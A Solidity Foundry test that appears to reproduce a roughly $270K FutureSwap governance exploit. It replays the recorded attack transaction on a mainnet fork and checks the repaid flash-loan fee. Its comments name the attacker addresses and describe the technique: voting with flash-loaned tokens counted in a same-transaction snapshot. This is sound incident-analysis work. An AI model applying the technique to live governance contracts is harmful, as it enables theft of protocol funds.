// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$270K
    - Attacker: 0xcd7c839c6814234601fe7719da21a980c1a8184e
    - Attack Contract: 0xbc59f04fa5e5936cf49991a268832714f17bffa7
    - Attack Tx: https://etherscan.io/tx/0x23c6a1e3fa409fcf17b4a6c385924a17546772ce77b314d001cbf0dab9469ba3
    - Analysis: https://blog.verichains.io/p/governance-attack-flashloan-vote

    FutureSwap governance counted flash-loaned FST in its same-transaction
    snapshot. The attacker borrowed FST, created and executed a malicious
    governance action, then repaid the principal plus fee atomically.
*/

interface IERC20FutureSwap {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract FutureSwapExploitTest is Test {
    bytes32 private constant ATTACK_TX = 0x23c6a1e3fa409fcf17b4a6c385924a17546772ce77b314d001cbf0dab9469ba3;
    IERC20FutureSwap private constant FST = IERC20FutureSwap(0x0E192d382a36De7011F795Acc4391Cd302003606);
    address private constant FLASH_LENDER = 0x88AE9E1625CfCbd128B89e7F037EaaF6a7cC9666;

    function setUp() public {
        vm.createSelectFork("mainnet", 24_012_461);
    }

    function testExploit() public {
        uint256 lenderBefore = FST.balanceOf(FLASH_LENDER);
        vm.transact(ATTACK_TX);
        uint256 fee = FST.balanceOf(FLASH_LENDER) - lenderBefore;

        emit log_named_decimal_uint("flash-loan fee repaid after malicious governance action", fee, 18);
        assertGt(fee, 10_000e18);
    }
}
